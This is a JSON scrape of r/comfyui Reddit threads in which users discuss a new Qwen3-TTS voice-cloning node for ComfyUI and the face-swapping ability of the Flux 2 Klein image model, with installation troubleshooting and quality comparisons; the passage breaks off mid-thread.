{
  "metadata": {
    "last_updated": "2026-01-27 08:48:56",
    "time_filter": "week",
    "subreddit": "comfyui",
    "total_items": 20,
    "total_comments": 281,
    "file_size_bytes": 322610
  },
  "items": [
    {
      "id": "1qljtix",
      "title": "üéôÔ∏è A New Voice Has Arrived ‚Äî Qwen3-TTS Custom Node for ComfyUI Is Here",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qljtix",
      "author": "Narrow-Particular202",
      "created_utc": "2026-01-24 10:38:44",
      "score": 360,
      "num_comments": 69,
      "upvote_ratio": 0.99,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qljtix/a_new_voice_has_arrived_qwen3tts_custom_node_for/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o1erxk1",
          "author": "SubstantialYak6572",
          "text": "Looks interesting but those Huggingface hub files are just annoying with all those extra json files. Hopefully someone will package it into a single safetensors or gguf file so it doesn't clutter the model folder up.",
          "score": 12,
          "created_utc": "2026-01-24 11:31:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f8crl",
              "author": "ANR2ME",
              "text": "GGUF for the 1.7b model https://huggingface.co/mradermacher/Qwen3-1.7B-Multilingual-TTS-GGUF\n\nBut not sure whether this is the same model or not üòÖ since the files were uploaded on September 2025.",
              "score": 7,
              "created_utc": "2026-01-24 13:33:26",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1h4sea",
              "author": "Narrow-Particular202",
              "text": "The model was released just a few days ago, so it‚Äôs still very early.  \nIf it gains traction, GGUF versions will likely show up soon, and we‚Äôll update the node to support them. Stay tuned üôÇ",
              "score": 2,
              "created_utc": "2026-01-24 18:59:00",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gr9mr",
          "author": "Narrow-Particular202",
          "text": "The¬†**Qwen3-TTS**¬†model was just released About 3 days ago. Our new custom node is still a preliminary build and requires time for fine-tuning. Any error logs and bug reports are greatly appreciated as they help us continuously improve it. Thank you again for your support.",
          "score": 10,
          "created_utc": "2026-01-24 18:01:30",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o1i5fox",
          "author": "Plenty-Mix9643",
          "text": "Is there an way to change the emotion of the cloned Voice?",
          "score": 7,
          "created_utc": "2026-01-24 21:48:23",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l9n46",
              "author": "ronbere13",
              "text": "No",
              "score": 1,
              "created_utc": "2026-01-25 09:20:38",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1xegvr",
              "author": "LanceCampeau",
              "text": "The tone of the vocal sample is *very* important.\n\nIf you have access to a large pool of sample clips of the voice you are trying to clone, you'll have to pick the parts that match the vocal inflection you are trying for. Otherwise you may be out of luck\n\nAt present, I'm experimenting with mixing & blending voice samples to shape the outcome of the cloned profile (I.E. adding improvised / impersonated audio along with the original to give the profile more tonal depth)",
              "score": 1,
              "created_utc": "2026-01-27 00:39:07",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1f4cu4",
          "author": "RatioTheRich",
          "text": "cann't isntall requirements.txt because of depedency conflicts with huggingface\\_hub",
          "score": 6,
          "created_utc": "2026-01-24 13:08:00",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f4l60",
              "author": "RatioTheRich",
              "text": "ERROR: Cannot install -r requirements.txt (line 1), -r requirements.txt (line 11), huggingface\\_hub>=1.3.2 and transformers==4.57.3 because these package versions have conflicting dependencies.\n\n\n\nThe conflict is caused by:\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.3 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.6 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.5 depends on huggingface-hub<1.0 and >=0.34.0\n\nThe user requested huggingface\\_hub>=1.3.2\n\naccelerate 1.12.0 depends on huggingface\\_hub>=0.21.0\n\ntransformers 4.57.4 depends on huggingface-hub<1.0 and >=0.34.0",
              "score": 9,
              "created_utc": "2026-01-24 13:09:32",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1h5ll4",
              "author": "Narrow-Particular202",
              "text": "Thanks for reporting this ‚Äî we‚Äôre always listening to user feedback.  \nWe‚Äôve already updated the requirements to avoid conflicts with existing ComfyUI environments.  \nPlease update to **v1.0.1** and try again.",
              "score": 5,
              "created_utc": "2026-01-24 19:02:33",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1hv802",
          "author": "Patient_Weakness4517",
          "text": "Is it possible to add style impressions to the cloned voice (base model)",
          "score": 6,
          "created_utc": "2026-01-24 21:00:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1mvbgp",
              "author": "ronbere13",
              "text": "No",
              "score": 1,
              "created_utc": "2026-01-25 15:48:08",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1favaj",
          "author": "MortgageOutside1468",
          "text": "This guy also made a comfyui node:  \n[https://github.com/DarioFT/ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)\n\nFound it from here:  \n[https://huggingface.co/Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice/discussions/7](https://huggingface.co/Qwen/Qwen3-TTS-12Hz-1.7B-CustomVoice/discussions/7)\n\nDon't ask me about the implementation though i haven't checked the node.",
          "score": 5,
          "created_utc": "2026-01-24 13:48:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hawsv",
              "author": "Narrow-Particular202",
              "text": "Haha üòÑ looks like we should start advertising over there too üòä  \nJokes aside, it‚Äôs great to see multiple open-source implementations popping up. Feel free to try both and pick whichever fits your workflow best.",
              "score": 5,
              "created_utc": "2026-01-24 19:25:54",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1j9b4c",
              "author": "phazei",
              "text": "I examined the code from both repos, and DarioFT's implementation is significantly better to fit in the comfyUI ecosystem.",
              "score": 1,
              "created_utc": "2026-01-25 01:11:59",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1q6o1q",
                  "author": "Left_Ad7536",
                  "text": "Entretanto, n√£o consegui instalar a do DarioFT pois pede onnxruntime e eu n√£o tenho isso no reposit√≥rio do Python.",
                  "score": 1,
                  "created_utc": "2026-01-26 00:32:29",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o1rg3gb",
                  "author": "MortgageOutside1468",
                  "text": "Here is comparison:  \n[https://github.com/copilot/share/c86c0020-43e0-8497-b942-d408206768f7](https://github.com/copilot/share/c86c0020-43e0-8497-b942-d408206768f7)  \nUsing GPT 5.2",
                  "score": 1,
                  "created_utc": "2026-01-26 04:35:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1it3wl",
          "author": "throwaway510150999",
          "text": "Does Voice Clone mode allow style instructions?",
          "score": 4,
          "created_utc": "2026-01-24 23:46:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1jk4xv",
          "author": "bezbol",
          "text": "Sorry for noob question, anyway to get qwen3 to moan?",
          "score": 4,
          "created_utc": "2026-01-25 02:11:42",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1l9st0",
              "author": "ronbere13",
              "text": "![gif](giphy|ydvukZqFGjqBshPw3H)",
              "score": 6,
              "created_utc": "2026-01-25 09:22:03",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1fx0b4",
          "author": "GravitationalGrapple",
          "text": "It‚Äôs going to take a lot for me to move away from IndexTTS2. Voice cloning, emotional control, good cadence‚Ä¶ I just wish I could get the nodes from snicolast to work, the UI it comes with is just okay.\n\nhttps://github.com/snicolast/ComfyUI-IndexTTS2",
          "score": 3,
          "created_utc": "2026-01-24 15:46:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ik017",
          "author": "LanceCampeau",
          "text": "Been playing around with Qwen3 TTS it this afternoon (local)\n\nA few thoughts...  the Voice Design workflow is fantastic, some amazing results so far.\n\nThe Voice Clone function has been pretty \"meh\" so far but I might be doing something wrong.\n\nbut all in all I'd suggest Eleven Labs voice services just got nuked pretty badly (for English at least)",
          "score": 3,
          "created_utc": "2026-01-24 22:59:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1iozgo",
              "author": "Snoo20140",
              "text": "Same experience here. TTS voice cloning from a year ago seemed a bit better, but I too might be missing something. As I don't see much in the means of controls.",
              "score": 1,
              "created_utc": "2026-01-24 23:25:01",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1j3gs3",
                  "author": "LanceCampeau",
                  "text": "I've realized that adding \"reference text\" to the voice clone module really helps. Also, my sample is 20 seconds long. \n\nStarting to get good results now.",
                  "score": 1,
                  "created_utc": "2026-01-25 00:40:20",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1j8q8x",
          "author": "phazei",
          "text": "Your nodes look great, but unfortunately it doesn't really handle memory management in a ComfyUI type way.  It'll have lots of issues fitting into other workflows.  Should really do your best to implement in a fashion that uses comfyui's built in components and use a loader node so we can handle our own model downloads while only keeping the extra config files in the repo.",
          "score": 3,
          "created_utc": "2026-01-25 01:08:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1eyvev",
          "author": "Nokai77",
          "text": "I think he's missing the ability to inject emotion into a cloned voice... FAILURE",
          "score": 10,
          "created_utc": "2026-01-24 12:28:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1hcanr",
              "author": "Narrow-Particular202",
              "text": " Thanks for calling this out, you‚Äôre right.\n\nAt the moment, emotion/style injection only works on CustomVoice / VoiceDesign, while VoiceClone (Base) does not  officially support instruct/emotion control in the current Qwen3‚ÄëTTS public release. We‚Äôre following the upstream updates; if Qwen exposes emotion control for cloning (or 25Hz models add it), we‚Äôll add it as soon as it‚Äôs available.\n\nIf you have a specific example prompt + reference audio where you expect emotion control, feel free to share, it helps  us test and refine.",
              "score": 7,
              "created_utc": "2026-01-24 19:31:58",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o1lnqgo",
                  "author": "Nokai77",
                  "text": "For me, Vibevoice is still king; the emotion in the lines is the best, it gives it the realism we   \nwant.\n\n\"Don't make me repeat myself. Go to your room, you're grounded!\"",
                  "score": 1,
                  "created_utc": "2026-01-25 11:25:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o1g2ihr",
              "author": "ronbere13",
              "text": "you're right",
              "score": 2,
              "created_utc": "2026-01-24 16:11:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1gj7sy",
                  "author": "FaceDeer",
                  "text": "That was missing from the other Qwen3TTS nodes I tried out last night as well, I guess it wasn't in the base code that Qwen put out and is going to take a bit more work to put in?",
                  "score": 1,
                  "created_utc": "2026-01-24 17:26:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fx17l",
          "author": "NoBuy444",
          "text": "Oh yeah !!!  And by 1038lab. Boy, we're spoiled :-D",
          "score": 2,
          "created_utc": "2026-01-24 15:46:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h74pc",
              "author": "Narrow-Particular202",
              "text": "Thanks for your support ‚ù§Ô∏è",
              "score": 2,
              "created_utc": "2026-01-24 19:09:13",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1glyhx",
          "author": "CheeseWithPizza",
          "text": "Cant you guys keep a single fixed folder for models. i dont want to keep same model multiple times\n\n    You can download models manually and place them into:\n    ComfyUI/models/TTS/Qwen3-TTS/<MODEL_NAME>/\n\nEvery F QwenTTS repo using its own way",
          "score": 2,
          "created_utc": "2026-01-24 17:38:25",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h9a9a",
              "author": "Narrow-Particular202",
              "text": "Totally understand, having multiple model folders is frustrating.  \nWe hear you, and we‚Äôre planning to support **ComfyUI** `extra_model_paths.yaml` in an upcoming update so you can keep a single, shared model location.\n\nFeedback like this is always welcome. If you have more suggestions or run into issues, feel free to open an issue or feature request on GitHub ‚Äî it really helps us improve the experience.",
              "score": 1,
              "created_utc": "2026-01-24 19:18:46",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o1i49nf",
          "author": "Reasonable-Card-2632",
          "text": "Bro what's the maximum text you can generate in one time? \n1. Your gpu. \n2. Total text character? \n3. Time taken. \n\nText to speech",
          "score": 2,
          "created_utc": "2026-01-24 21:42:51",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1io2xj",
              "author": "iceyed913",
              "text": "I am getting about 20 seconds worth of audio on my rtx 5090. Anything over a few lines of text and it starts munching through vram gradually and spits out 2:43 min long garbage audio. I must be doing something wrong if people are running entire chapters TTA almost in realtime on rtx 5090. Maybe its the comfui setup/dependancies but its saying all requirements are met when i try to reinstall so no idea tbh.",
              "score": 4,
              "created_utc": "2026-01-24 23:20:23",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1ipq9x",
                  "author": "LanceCampeau",
                  "text": "I get identical results (4090)",
                  "score": 1,
                  "created_utc": "2026-01-24 23:28:54",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1eo44v",
          "author": "Atmey",
          "text": "Would be nice to hear an example or sample",
          "score": 3,
          "created_utc": "2026-01-24 10:57:45",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1erb7v",
              "author": "Coloniaman",
              "text": "You can use the example on huggingface and use your own text!",
              "score": 7,
              "created_utc": "2026-01-24 11:26:24",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1gaace",
          "author": "OtherProfessional433",
          "text": "isn‚Äôt just about...  \nIt‚Äôs about...\n\nCome on, man.",
          "score": 2,
          "created_utc": "2026-01-24 16:46:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1gnded",
              "author": "CheeseWithPizza",
              "text": "forget this.  \nsupport [https://github.com/DarioFT/ComfyUI-Qwen3-TTS](https://github.com/DarioFT/ComfyUI-Qwen3-TTS)",
              "score": 1,
              "created_utc": "2026-01-24 17:44:41",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1hadmy",
                  "author": "Narrow-Particular202",
                  "text": "All good, this is an open-source ecosystem, and we‚Äôre happy to see more developers working on it.  \nMore implementations usually mean faster improvements for everyone. Feel free to try both projects and use whichever fits your workflow best.",
                  "score": 4,
                  "created_utc": "2026-01-24 19:23:38",
                  "is_submitter": true,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1fu3wn",
          "author": "Ecstatic_Sale1739",
          "text": "I can‚Äôt find it in comfyui manager..üò¢üò¢",
          "score": 1,
          "created_utc": "2026-01-24 15:32:24",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1h6umw",
              "author": "Narrow-Particular202",
              "text": "You might find it by searching for \"QwenTTS\" or \"ComfyUI-QwenTTS\", developed by AILab.",
              "score": 1,
              "created_utc": "2026-01-24 19:08:02",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o1hpy7r",
              "author": "Zueuk",
              "text": "i opened the comfy manager today and found at least 5 nodes that matched QwenTTS... now i'm not sure which one to install üòï",
              "score": 1,
              "created_utc": "2026-01-24 20:34:51",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1g6fj8",
          "author": "RazsterOxzine",
          "text": "One more key component for AI world domination, but in a friendly voice you recognize, because it will already know everything about you. Well done. gg wp.",
          "score": 1,
          "created_utc": "2026-01-24 16:29:28",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1gfdh4",
          "author": "mrImTheGod",
          "text": "How does it compare to fish-speach or vibeVoice 7b - i think 1.x B models are way too small to be good",
          "score": 1,
          "created_utc": "2026-01-24 17:09:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1go76i",
              "author": "35point1",
              "text": "The demos on HF were sub par in comparison to vibevoice if you ask me",
              "score": 2,
              "created_utc": "2026-01-24 17:48:19",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1hqp6d",
          "author": "Green-Ad-3964",
          "text": "Is \"Italian\" supported? Also, I'd need to convert long text to speech. Is there a convenient way to do so?",
          "score": 1,
          "created_utc": "2026-01-24 20:38:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1lgxoa",
              "author": "superacf",
              "text": "Yes, there are many language supported with Qwen3-TTS.",
              "score": 2,
              "created_utc": "2026-01-25 10:25:38",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1lxr4e",
                  "author": "Green-Ad-3964",
                  "text": "but even if Italian is always included in the list, I can't see the selector for that language...",
                  "score": 1,
                  "created_utc": "2026-01-25 12:45:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o1ipi3m",
          "author": "iceyed913",
          "text": "I just got this error on my rtx 5090. Sending you a full error log by DM \n\nAILab\\_Qwen3TTSVoiceClone\n\nCUDA error: out of memory  \nSearch for \\`cudaErrorMemoryAllocation' in [https://docs.nvidia.com/cuda/cuda-runtime-api/group\\_\\_CUDART\\_\\_TYPES.html](https://docs.nvidia.com/cuda/cuda-runtime-api/group__CUDART__TYPES.html) for more information.  \nCUDA kernel errors might be asynchronously reported at some other API call, so the stacktrace below might be incorrect.  \nFor debugging consider passing CUDA\\_LAUNCH\\_BLOCKING=1  \nCompile with \\`TORCH\\_USE\\_CUDA\\_DSA\\` to enable device-side assertions.",
          "score": 1,
          "created_utc": "2026-01-24 23:27:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1jkbak",
              "author": "VanessaCarter",
              "text": "Let me know if you figure it out, and if it worked. Maybe it's still in beta or still in the testing phase.",
              "score": 2,
              "created_utc": "2026-01-25 02:12:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o1lw5dp",
          "author": "tatamigalaxy_",
          "text": "Did this work for a single person? All the workflows and nodes that I've seen till now have been completely useless. Maybe this one is different...",
          "score": 1,
          "created_utc": "2026-01-25 12:33:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ni98z",
          "author": "renczzz",
          "text": "Pretty nice! It works on amd gpu's too. the only thing is, it got stuck here and there while generating. I had to replace some lines in the code to disable flash attention. generation is slower, but no more errors. Thanks!",
          "score": 1,
          "created_utc": "2026-01-25 17:27:17",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1nwo3t",
          "author": "Forsaken-Truth-697",
          "text": "I can clone professional sounding voices using Chatterbox without any extra complexity.\n\nThanks anyways, maybe i try this later.",
          "score": 1,
          "created_utc": "2026-01-25 18:27:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1fcapa",
          "author": "EnvironmentalDust229",
          "text": "This is amazing!",
          "score": 1,
          "created_utc": "2026-01-24 13:56:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1ffq3r",
          "author": "SnooPuppers4132",
          "text": "thank you",
          "score": 1,
          "created_utc": "2026-01-24 14:16:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o1exnaj",
          "author": "Key_Highway_8728",
          "text": "Apparently needs shitloads of vram?  \"If your machine has less than 96GB of RAM...\"",
          "score": 0,
          "created_utc": "2026-01-24 12:19:16",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1f205x",
              "author": "BarGroundbreaking624",
              "text": "Is that for training because I‚Äôve been running it and the 1.7b  models only seem to use half my 24gb VRAM \n\n\nThe clone seems pretty good and voice design too. \nI don‚Äôt know why I always try to do something awkward - you can‚Äôt tell a cloned voice to use emotion in the same was as custom voice so it has to infer it from the spoken words‚Ä¶",
              "score": 9,
              "created_utc": "2026-01-24 12:51:46",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1fciyc",
              "author": "raz0099",
              "text": "Or just give it a try with wangp.",
              "score": 3,
              "created_utc": "2026-01-24 13:58:11",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1f7zfc",
              "author": "aeroumbria",
              "text": "I think that is for manually compiling flash attention if you have like 64GB of RAM but a 9950. In this case you don't have enough RAM to run 16 or 32 threads of compilation, so you have to cap the jobs to a smaller number.",
              "score": 2,
              "created_utc": "2026-01-24 13:31:09",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qjmzm5",
      "title": "Flux 2 Klein has decent built-in face swapping ability",
      "subreddit": "comfyui",
      "url": "https://www.reddit.com/gallery/1qjmzm5",
      "author": "slpreme",
      "created_utc": "2026-01-22 06:20:13",
      "score": 313,
      "num_comments": 62,
      "upvote_ratio": 0.97,
      "text": "[External Link]",
      "is_original_content": false,
      "link_flair_text": "Workflow Included",
      "permalink": "https://reddit.com/r/comfyui/comments/1qjmzm5/flux_2_klein_has_decent_builtin_face_swapping/",
      "domain": "reddit.com",
      "is_self": false,
      "comments": [
        {
          "id": "o10akpf",
          "author": "inagy",
          "text": "This model is a real surprise to me. Even the 4B (which is really fast) is good at isolating parts, replacing elements, \"understanding\" controlnet images.",
          "score": 20,
          "created_utc": "2026-01-22 07:19:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o13fk77",
              "author": "ChicoTallahassee",
              "text": "Is the 4b base better than 9b distilled?",
              "score": 2,
              "created_utc": "2026-01-22 18:46:13",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o1416zi",
                  "author": "inagy",
                  "text": "**For others reading this comment for the first time**: looks like I was mislead by that [ComfyUI blog](https://blog.comfy.org/p/flux2-klein-4b-fast-local-image-editing), as the 9b distilled model is available here [https://huggingface.co/black-forest-labs/FLUX.2-klein-9B](https://huggingface.co/black-forest-labs/FLUX.2-klein-9B)\n\n\\---\n\nI've only tested the 9b base, because the distilled is API only, and I'm only interested in local models. 9b is more capable of course, it also uses Qwen3 8b instead of 4b, so the prompt understanding is obviously better, because the text encoder is more capable. But it's much slower. At the same time 9b base renders an image with 20 or so steps, I can do 2-3 smaller edits with 4b distilled, multiple edits chained after another or just do quicker edit-generate turns overall. And if you don't overload 4b with too many editing instructions at once, it's pretty capable as I see. 4b seems to struggle with text rendering a bit though.",
                  "score": 0,
                  "created_utc": "2026-01-22 20:24:29",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o10cgu7",
          "author": "Snoo20140",
          "text": "I tried it already and had issues with lighting mismatching. It doesn't seem to handle low resolution faces or conflicting lighting from my tests. \n\nMaybe it was just my run/prompts/images tho.",
          "score": 9,
          "created_utc": "2026-01-22 07:36:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o10hs9m",
              "author": "slpreme",
              "text": "prompt is still important i barely wrote it in a minute. maybe adding a prompt about the lighting would help",
              "score": 8,
              "created_utc": "2026-01-22 08:24:44",
              "is_submitter": true,
              "replies": []
            },
            {
              "id": "o10r8ff",
              "author": "Bronzeborg",
              "text": "use the relight template to fix old images first :)",
              "score": 3,
              "created_utc": "2026-01-22 09:54:11",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o16qt1e",
                  "author": "Snoo20140",
                  "text": "That isn't a bad idea. Will give it a go. I appreciate it.",
                  "score": 1,
                  "created_utc": "2026-01-23 05:15:35",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o134e13",
              "author": "yoomiii",
              "text": "indeed, I had this issue as well",
              "score": 1,
              "created_utc": "2026-01-22 17:57:04",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o11f7ps",
          "author": "D0wly",
          "text": "I found that making an (single) image in photoshop with multiple faces of the reference subject helps a ton.",
          "score": 8,
          "created_utc": "2026-01-22 13:01:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o114p73",
          "author": "huaweio",
          "text": "Playing around with the sigma\\_max values ‚Äã‚Äã(\\~0.95-0.98) yields some interesting results. The main problem I see is the size difference between the heads. It usually makes the head larger than the body. I've tried adding some extra instructions to the prompt, but without success. I don't know if anyone has been able to find a solution.",
          "score": 7,
          "created_utc": "2026-01-22 11:49:28",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1152dv",
              "author": "slpreme",
              "text": "yeah i really tried but it loves making bobble heads",
              "score": 7,
              "created_utc": "2026-01-22 11:52:11",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o11kyh2",
                  "author": "huaweio",
                  "text": "Great job anyways!",
                  "score": 1,
                  "created_utc": "2026-01-22 13:34:09",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            },
            {
              "id": "o11vjxx",
              "author": "Expicot",
              "text": "So far my best trick is to photoshop the new head over the old one (so human control about the proportions), and make the \"swap\" using the same new face as reference. Works pretty well. Better than all previous checkpoints and edit version I had tried so far (Qwen, Kontext).",
              "score": 4,
              "created_utc": "2026-01-22 14:29:46",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o15ctsr",
                  "author": "slpreme",
                  "text": "hmm maybe i can make a node to do this automatically",
                  "score": 3,
                  "created_utc": "2026-01-23 00:25:17",
                  "is_submitter": true,
                  "replies": []
                },
                {
                  "id": "o170l40",
                  "author": "orangeflyingmonkey_",
                  "text": "hey! do you have an example maybe you can share? I am having the same problem.",
                  "score": 1,
                  "created_utc": "2026-01-23 06:29:25",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o104kxy",
          "author": "Ok-Page5607",
          "text": "this is great! thanks for sharing",
          "score": 4,
          "created_utc": "2026-01-22 06:28:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o104za6",
              "author": "slpreme",
              "text": "of course:)",
              "score": 2,
              "created_utc": "2026-01-22 06:31:50",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o10hkn5",
          "author": "eidrag",
          "text": "I found that for better headswap you have to make the face straight forward 1st, before swapping",
          "score": 3,
          "created_utc": "2026-01-22 08:22:44",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o10wh58",
          "author": "diffusion_throwaway",
          "text": "What about facial expressions? I‚Äôve had good luck cloning faces, but what if you want the expression from face 1 applied to face 2? As far as I can tell this isn‚Äôt possible. I hope someone can prove me wrong though.",
          "score": 3,
          "created_utc": "2026-01-22 10:41:38",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o10qqfb",
          "author": "Ok-Internal9317",
          "text": "Compared to Qwen?",
          "score": 4,
          "created_utc": "2026-01-22 09:49:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o1601hi",
              "author": "Swimming_Dragonfly72",
              "text": "Flux klein much much better in face swap than qwen. And faster ~ x6 times.¬†\nBut qwen has absolute domination on anatomy and 3D space understanding.¬†\nThey complement each other perfectly",
              "score": 2,
              "created_utc": "2026-01-23 02:33:40",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o18gb2l",
                  "author": "Ok-Internal9317",
                  "text": "I'll try it out, good insight!",
                  "score": 1,
                  "created_utc": "2026-01-23 13:28:45",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o104s24",
          "author": "ton89y2k",
          "text": "9B or 4B  or Both",
          "score": 2,
          "created_utc": "2026-01-22 06:30:09",
          "is_submitter": false,
          "replies": [
            {
              "id": "o104xpu",
              "author": "slpreme",
              "text": "can work with both but 9b is a lot better",
              "score": 3,
              "created_utc": "2026-01-22 06:31:28",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o10srtl",
          "author": "Mugaluga",
          "text": "I think it's pretty good for faces and portraits, upper bodies and even standing in neutral poses. But not much beyond that.\n\nQwen Image Edit is a better tool IMO. And Qwen-Rapid-AIO is even better (because it's based on Qwen Image Edit) but it's also NSFW.\n\nThey will handle everything Klein will but won't fall apart with anatomy nearly as often.\n\nLet's just be honest here. Klein is not great at anatomy and VERY commonly screws up hands, arms and legs. Not every time, but very often.\n\nAlso I am using the default Klein edit workflow from Comfy but for some reason it doesn't let you choose the output resolution. You can open the subgraph and choose a megapixel value, like 1mp or 2mp but it doesn't let you directly choose your output resolution. Anyone know why? Is this a limitation of Klein editing or just a limitation of the template workflow?\n\nMy Qwen Image Edit WF lets me choose the exact output resolution - I prefer that.",
          "score": 5,
          "created_utc": "2026-01-22 10:08:30",
          "is_submitter": false,
          "replies": [
            {
              "id": "o11slx0",
              "author": "mnmtai",
              "text": "You can change resolution like with any other workflow out there. Modify the latent node.",
              "score": 2,
              "created_utc": "2026-01-22 14:14:36",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o11k3g2",
              "author": "bhasi",
              "text": "\"My Qwen Image Edit WF lets me choose the exact output resolution - I prefer that.\"\n\nJust use the same node? Skill issue",
              "score": 2,
              "created_utc": "2026-01-22 13:29:21",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o14bgfp",
              "author": "Own-Quote-2365",
              "text": "Does the Qwen editor also work with the same model, text encoder, and VAE installation, along with basic CompyNode requirements? And what are the system requirements? When I tried using Klein, I was able to use it with only the basic downloads. It ran quickly and smoothly even with low VRAM.",
              "score": 1,
              "created_utc": "2026-01-22 21:12:54",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o1r1z0t",
              "author": "juandann",
              "text": "really? I often get screwed up anatomy also with qwen image edit",
              "score": 1,
              "created_utc": "2026-01-26 03:11:10",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o12x63q",
          "author": "tempedbyfate",
          "text": "The first image looks like the face was photoshopped onto the image, head looks too big to me and doesn't really fit overall.",
          "score": 2,
          "created_utc": "2026-01-22 17:24:37",
          "is_submitter": false,
